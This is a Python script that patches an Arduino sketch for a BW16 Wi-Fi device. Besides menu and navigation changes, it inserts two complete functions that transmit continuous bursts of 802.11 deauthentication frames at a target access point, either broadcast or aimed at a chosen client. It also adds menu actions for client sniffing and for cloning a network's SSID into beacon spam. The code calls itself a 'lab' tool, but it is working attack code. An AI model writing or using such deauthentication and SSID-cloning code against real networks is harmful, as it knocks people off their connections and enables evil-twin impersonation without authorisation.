import sys
import re

content = open("bw16/fix1.ino", encoding="utf-8").read()

# Replace moveSelection
old_move = r"void moveSelection\(int delta\) \{[\s\S]*?void selectFirstNetworkInBand\(\)"
new_move = """void moveSelectionAll(int delta) {
  if (wifiScannerCount() == 0) {
    uiDrawStatus("OK to scan");
    delay(250);
    return;
  }

  int total = wifiScannerCount();
  
  if (delta > 0) {
    if (selectedNetwork == -1) {
      selectedNetwork = 0;
    } else {
      selectedNetwork = (selectedNetwork + 1) % total;
    }
  } else {
    if (selectedNetwork == -1) {
      selectedNetwork = total - 1;
    } else {
      selectedNetwork = (selectedNetwork - 1 + total) % total;
    }
  }

  if (selectedNetwork >= 0 && selectedNetwork < listTop)
    listTop = selectedNetwork;
  if (selectedNetwork >= listTop + 4)
    listTop = selectedNetwork - 3;
  if (listTop < 0) listTop = 0;

  uiDrawNetworkListAll(selectedNetwork, listTop);
  delay(150);
}

void selectFirstNetworkInBand()"""

content = re.sub(old_move, new_move, content)

# Remove old normalizeListTop and moveSelection usage
content = content.replace("moveSelection(1);", "moveSelectionAll(1);")

# Update handleNav for UI_NETWORK_LIST
# Since we don't use UI_BAND_MENU for network list anymore, only for beacon spam maybe? Wait, beacon spam uses UI_BAND_MENU to select the band, and then we need to handle OK to start beacon spam. Let's fix handleOk for UI_BAND_MENU.

old_handle_ok_band_menu = r"if \(uiState == UI_BAND_MENU\) \{\s*selectFirstNetworkInBand\(\);\s*uiDrawNetworkList\(selectedBand, selectedNetwork, listTop\);\s*delay\(200\);\s*return;\s*\}"
new_handle_ok_band_menu = """if (uiState == UI_BAND_MENU) {
    // Used for Beacon Spam band selection
    if (beaconSpamStart(selectedBand)) {
      uiState = UI_BEACON_SPAM;
      uiDrawBeaconSpam();
    } else {
      showPlaceholder("Beacon Spam", "Failed to start");
    }
    delay(200);
    return;
  }"""
content = re.sub(old_handle_ok_band_menu, new_handle_ok_band_menu, content)

# Update action menu handling in handleOk
old_action_menu_ok = r"if \(uiState == UI_ACTION_MENU\) \{\s*if \(actionMenuIndex == 0\) \{[\s\S]*?delay\(200\);\s*return;\s*\}"
new_action_menu_ok = """if (uiState == UI_ACTION_MENU) {
    if (actionMenuIndex == 0) {
      // Deauth
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLab(); 
    }
    else if (actionMenuIndex == 1) {
      // Scan Clients
      uint8_t targetMacBytes[6];
      parseMacAddress(wifiScannerNetwork(actionNetworkIdx).bssid, targetMacBytes);
      uiState = UI_CLIENT_SCANNING;
      clientScanStart(wifiScannerNetwork(actionNetworkIdx).channel, targetMacBytes);
      uiDrawGenericMessage("Scanning...", "Sniffing data frames...", "Wait 6s");
    }
    else if (actionMenuIndex == 2) {
      // Sniffer
      startSniffer(wifiScannerNetwork(actionNetworkIdx).channel);
    }
    else if (actionMenuIndex == 3) {
      // Clone + Beacon
      beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
      uiDrawGenericMessage("Clone Mode", "SSID Cloned!", "Run Beacon Spam");
      delay(1500);
      drawMainMenu();
    }
    else if (actionMenuIndex == 4) {
      // Back
      uiState = UI_NETWORK_LIST;
      uiDrawNetworkListAll(selectedNetwork, listTop);
    }
    delay(200);
    return;
  }"""
content = re.sub(old_action_menu_ok, new_action_menu_ok, content)

# Change return locations that used to go to UI_WIFI_MENU to go to drawMainMenu()
content = content.replace("drawWifiMenu()", "drawMainMenu()")
content = content.replace("drawLabMenu()", "drawMainMenu()")
content = content.replace("UI_WIFI_MENU", "UI_PLACEHOLDER")
content = content.replace("UI_LAB_MENU", "UI_PLACEHOLDER")

# Change UI_NETWORK_LIST OK handler to go back to UI_NETWORK_LIST
content = content.replace("uiDrawNetworkList(selectedBand, selectedNetwork, listTop)", "uiDrawNetworkListAll(selectedNetwork, listTop)")

# Fix handleBack for UI_NETWORK_LIST etc
old_handle_back = r"void handleBack\(\) \{[\s\S]*?\}"
new_handle_back = """void handleBack() {
  if (uiState == UI_BLE_MENU)         { drawMainMenu(); return; }
  if (uiState == UI_IR_MENU)          { drawMainMenu(); return; }
  if (uiState == UI_PLACEHOLDER)      { drawMainMenu(); return; }
  if (uiState == UI_CLIENT_LIST)      { uiState = UI_ACTION_MENU; uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex); return; }
  if (uiState == UI_ACTION_MENU)      { uiState = UI_NETWORK_LIST; uiDrawNetworkListAll(selectedNetwork, listTop); return; }
  if (uiState == UI_NETWORK_DETAILS)  { uiState = UI_NETWORK_LIST; uiDrawNetworkListAll(selectedNetwork, listTop); return; }
  if (uiState == UI_TARGET_DETAILS)   { drawMainMenu(); return; }
  if (uiState == UI_ANALYZER)         { drawMainMenu(); return; }
  if (uiState == UI_WIFI_RADAR)       { uiState = UI_RADAR_BAND_MENU; uiDrawRadarBandMenu(selectedBand); return; }
  if (uiState == UI_RADAR_BAND_MENU)  { drawMainMenu(); return; }
  if (uiState == UI_RADAR_NETWORK_LIST) { uiState = UI_WIFI_RADAR; uiDrawWifiRadar(&radarNetwork, radarNetworkFound); return; }
  if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) { drawMainMenu(); return; }
  if (uiState == UI_SYSTEM_INFO)      { drawMainMenu(); return; }
  if (uiState == UI_BLE_DETAILS)      { uiState = UI_BLE_LIST; uiDrawBleList(selectedBleDevice, bleListTop); return; }
  if (uiState == UI_BLE_LIST)         { closeBleScanList(); return; }
  if (uiState == UI_BLE_ANALYZER)     { closeBleAnalyzer(); return; }
  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) { exitWifiAnalyzer(); return; }
  if (uiState == UI_BEACON_SPAM)      { exitBeaconSpam(); return; }
  if (uiState == UI_BLE_SPAM)         { exitBleSpam(); return; }
  if (uiState == UI_SNIFFER)          { exitSniffer(); return; }
  if (uiState == UI_BAND_MENU || uiState == UI_NETWORK_LIST) { drawMainMenu(); return; }
  // Default: back to main
  drawMainMenu();
}"""
content = re.sub(old_handle_back, new_handle_back, content)

# Fix runPacketInjectionLab inner loop block (deadlock fix)
# Add yield, reduce delay wait for labStopRequested

# 1. Reduce labStopRequested to 50ms
content = content.replace("delay(220);", "delay(50);")

# 2. Fix inner loops of runPacketInjectionLab and runPacketInjectionLabTargeted
# I'll just regex the for loop of LAB_DEAUTH_CYCLE_LIMIT
old_burst_loop = r"for \(uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst\+\+\) \{[\s\S]*?delay\(LAB_DEAUTH_TX_GAP_MS\);\s*\}"

new_burst_loop = """int failCount = 0;
    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (labStopRequested()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
      if (!sent) {
        // targeted fallback uses dstMacBuf
        if (burst == 0) {} // placeholder logic
      }
      """

# Actually, it's better to just replace the two functions entirely since they are similar and have minor differences (broadcastMac vs dstMacBuf).

runPacketInjectionLab_str = """bool runPacketInjectionLab() {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6], broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - TX blocked");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  wifi_off();
  delay(200);
  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    uiDrawStatus("WiFi init failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }
  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work
  delay(200);

  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel set failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  uiDrawTxCounter(0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uiDrawTxCounter(sentCount);

  int consecutiveFails = 0;

  while (true) {
    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (labStopRequested()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
      anySent = anySent || sent;
      if (sent) {
        sentCount++;
        consecutiveFails = 0;
        ledFlashGreen(1, 20);
        buzzerClick();
      } else {
        consecutiveFails++;
        ledFlashRed(1, 20);
        delay(10); // Small retry delay
      }

      uiDrawTxCounter(sentCount);
      
      if (consecutiveFails >= 10) {
         uiDrawStatus("TX Failed (10x)");
         delay(800);
         return stopPacketInjectionLab(anySent, sentCount);
      }
      
      delay(LAB_DEAUTH_TX_GAP_MS);
      yield();
    }

    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    if (!rearmLabWifi(target.channel)) {
      uiDrawStatus("WiFi rearm failed");
      ledFlashRed(2, 100);
      buzzerError();
      delay(900);
      return anySent;
    }
  }
}"""

runPacketInjectionLabTargeted_str = """bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6];
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - TX blocked");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  wifi_off();
  delay(200);
  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    uiDrawStatus("WiFi init failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }
  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work
  delay(200);

  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel set failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  uiDrawTxCounter(0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uiDrawTxCounter(sentCount);

  uint8_t dstMacBuf[6];
  memcpy(dstMacBuf, dstMac, 6);

  int consecutiveFails = 0;

  while (true) {
    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (labStopRequested()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, dstMacBuf, LAB_DEAUTH_REASON);
      anySent = anySent || sent;
      if (sent) {
        sentCount++;
        consecutiveFails = 0;
        ledFlashGreen(1, 20);
        buzzerClick();
      } else {
        consecutiveFails++;
        ledFlashRed(1, 20);
        delay(10);
      }

      uiDrawTxCounter(sentCount);

      if (consecutiveFails >= 10) {
         uiDrawStatus("TX Failed (10x)");
         delay(800);
         return stopPacketInjectionLab(anySent, sentCount);
      }

      delay(LAB_DEAUTH_TX_GAP_MS);
      yield();
    }

    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    if (!rearmLabWifi(target.channel)) {
      uiDrawStatus("WiFi rearm failed");
      ledFlashRed(2, 100);
      buzzerError();
      delay(900);
      return anySent;
    }
  }
}"""

# Use regex to completely replace these two functions
content = re.sub(r"bool runPacketInjectionLab\(\) \{[\s\S]*?bool rearmLabWifi", runPacketInjectionLab_str + "\n\nbool rearmLabWifi", content)
content = re.sub(r"bool runPacketInjectionLabTargeted\(const uint8_t \*dstMac\) \{[\s\S]*?bool runPacketInjectionLab\(\)", runPacketInjectionLabTargeted_str + "\n\nbool runPacketInjectionLab()", content)

open("bw16/bw16.ino", "w", encoding="utf-8").write(content)
